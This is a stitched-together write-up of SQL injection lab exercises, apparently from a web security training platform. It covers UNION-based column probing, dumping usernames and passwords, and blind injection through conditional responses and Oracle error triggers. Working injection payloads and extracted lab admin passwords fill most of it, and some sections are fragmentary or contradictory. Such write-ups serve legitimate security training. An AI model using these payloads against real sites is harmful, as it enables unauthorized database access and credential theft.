First thing to do is to confirm the number of columns available in the database

So, we'll be using the query
```
' order by 1--
' order by 2--
' order by 3--
```
Ensure this is url encoded, so when you get the internal server error, it means the column number isn't available

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/46cca6a6-9af2-41e9-a473-8f2388847fce)

This means there's a column available in the database,

This makes it 2 columns available in the database,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/28d25efa-ca02-4434-93ae-a908703068d9)

From the above screenshot you'll see that the query ```' order by 3--``` returned an Internal Server Error, which means there isn't a column 3 available in the database.

So, we have 2 columns available in the database.

To query the database version we can use the following query 
```
' UNION SELECT banner,null FROM v$version--
```
Explaining this
```
The banner column contains the information about the database version
The null is just there to fill in for the second column of the result
v$version is the name of a database table
```

```
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT null,null,null--
' UNION SELECT null,null,null,null--

First, lets determine the number of columns that's available in the database using the query
```
' order by 1--
' order by 2--
' order by 3--
' order by 4--
```
Ensure you url encode the query when you use it.

Alright, so we have 2 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4c1dded8-aae8-4cfb-bf45-cf8e5c5ce5b7)

So, there are 3 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/57d2fbcb-1b69-46c3-8028-834fe6d48e15)

We got an "Internal Server Error" meaning there isn't a column 4 in the database

Hence, we have 3 columns available in the database.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/50143fc9-d043-43bc-97bd-d2251d5125d7)

So, the task is to check which of the columns is compatible with string data. So, we are asked to return the string ```yuJfMW```.

Now, lets start by using the ```UNION``` method to confirm the number of columns. We can use the query
```
' UNION SELECT null,null,null--
```
If we don't get the "Internal Server Error" it means there truly are 3 columns available in the database. 

Applying the query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/201c39b0-c764-4f39-9aa2-86627659a7c7)

cool, now lets look for the vulnerable column that is compatible with string data. We can try the following queries
```
' UNION SELECT 'yuJfMW',null,null--
' UNION SELECT null,'yuJfMW',null--
' UNION SELECT null,null,'yuJfMW'--
```
So, a query not returning the "Internal Server Errror" means the column where the string is positioned is vulnerable.

Applying the queries,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8b2d5383-4809-44bb-88ab-a5340f8d49e1)

From the above screensots, you'll see that only the query ```' UNION SELECT null,'yuJfMW',null--``` was able to retrieve the string from the database.

Lets try to show the response in our browser

Cool, we have successfully solved the lab. So, it is safe to say the second column is compatible with string data.

Now, this should be an easy one since they already gave us the name of the table to be ```users```, also in the table there are columns ```username``` and ```password```. So, what we'll try to do is just determine the number of columns available in the database. We'll be using the query

' order by 2--
' order by 3--
```
Applying the query

We have a column available in the database

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b6c3f781-4138-418c-a666-1e4b54aec0a1)

Alright, so 2 columns are available in the database

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/20888d82-965e-4eab-afae-5a895cb76c26)

The "Internal Server Error" displayed is to tell us that there isn't a third column in the database.

So, we have 2 columns available in this database

Now, lets go ahead to dump the content of the columns ```username``` and ```password``` in the table ```users```. We can use this query
```
' UNION SELECT username,password FROM users--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/188133f5-c518-4378-8a91-e7beb6682ec5)

Cool, we got the creds for the administrator user

username:```administrator```          password:```nqic8fkyvzqjfez72khh```

Lets try to log in with thi creds

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fd1dc676-0992-4910-a13e-0675c83b495f)

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/68681c2b-03cb-47e4-a526-058afecdae0b)

Navigate to the website and click on "Lifestyle"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e2b5b9fd-20bc-4964-b804-41e7c23c3d01)

Capturing the request on burpsuite and sending it over to burp repeater,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fdce4358-ea13-417d-bc4a-c2208ff03ed0)

Lets go ahead and check the number of columns available in the database, we can use the queries
```
' order by 1--
' order by 2--
' order by 3--
```
Using these queries

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1ab904ef-0e97-4a99-95a1-20f57decf51d)

From the above screenshot, it is obvious that we have just 2 columns available in the database.

Lets go ahead and look for the vulnerable column, that is, the column that is compatible with string data. To do that we can use the query
```
' UNION SELECT 'abeg',null--
' UNION SELECT null,'abeg'--
```
url encode the query before using it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/07eecb17-1072-46b7-be4a-0340a36ebd98)

It is evident that the second column is actually compatible with string data.

Now, lets go ahead to dump the content of the columns ```username``` and ```password``` in the table ```users```. We can use this query

```
' UNION SELECT null,username || '~' || password FROM users--
```
Applying the query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dcc65a68-30c2-454e-ba9d-b3d21b573f99)

Cool, we got the creds for the administrator user.

username:```administrator```            password:```6tp172ew9j1sy5f7vx3d```

Lets try to log in with this creds we found

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2355ff27-ebbd-41ac-aaee-afb814bc8296)

Cool, we have successfully solved this lab.

#  Blind SQL injection with conditional responses
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cebd199e-fcb5-44c9-a0f9-97a8940ad3e4)

So, the application uses a tracking cookie for analytics

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c77d83c7-57c6-47f1-8b96-d1eee6311e30)

Click "View details" then capture the request on burpsuite

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e0791be6-76f1-4b3d-a046-964ef73eac0d)

Now, lets use conditional responses to check if it is vulnerable to blind SQLi. We can use the queries
```
' AND '1'='1
' AND '1'='2
```
Ensure it is url encoded when using it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed0b312f-16d3-45cb-afa2-c542203d35d6)

From the above screenshot we got the 'Welcome back!' message, this is because the condition ```'1'='1``` is always true.

Trying the second query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/912710c8-2b29-4f03-9a30-4391fec44413)

So, this didn't return the 'Welcome back!' message, this is because the condition ```'1'='2``` is always false.

Now, that we have confirmed that it is vulnerable, lets go ahead to obtain the password since we know the table name to be ```users``` and the name of the columns in the tables are ```username``` and ```password```. Also, we have the username to be ```administrator```.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2690fe5b-55ac-4c47-8df8-e65719fd9f4e)

Based on the hint we were provided, I think we now know what to focus on

To achieve this, we can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 's
```
Alright so, we'll be trying the letters all the way from ```a-z```, we'll also try the numbers ```0-9```, until we get a "Welcome back!" message

Trying this query you should get the first character of the password
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'p
```
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cbe640e7-9de5-4c93-b602-5153d527ee1c)

Cool, now that we got the first character, lets go ahead and query for the second character, We can use the query
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) = 'q
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bf2a6326-efe4-44a3-baeb-b409234a4bb4)

Now, lets start by testing conditions.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/809423b2-153b-4acf-a7bc-ff430cb59f0c)

From the hint provided we can see that this lab uses the oracle dabase

So, using this query we should be able to test the conditions
```
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)||'
```
Ensure you url encode this before using it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/85c9f86a-c57f-4955-94f4-8c930ab8fa2e)

We got the "Internal Server Error", this is because ```1=1``` will always be true at all times

Trying the second query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed83e499-8087-4ba2-bd74-863bb51a298a)

This query didn't throw an error because the condition ```1=2``` is not true
